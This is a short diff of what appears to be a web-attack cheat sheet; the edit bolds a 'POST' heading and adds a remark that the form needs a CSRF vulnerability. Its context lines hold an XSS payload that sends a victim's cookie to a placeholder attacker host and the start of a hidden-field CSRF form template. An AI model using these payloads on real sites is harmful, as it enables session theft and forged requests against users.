@@ -82,7 +82,8 @@ python -m SimpleHTTPServer
 <script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
 {% endhighlight %}
 
-POST:
+**POST:**
+*Needs CSRF Vulnerability to work*
 {% highlight html %}
 <form  ID=CSRF action="<website>" method="POST">
 <input type="hidden" name="<paramater>" value="<value>"/>
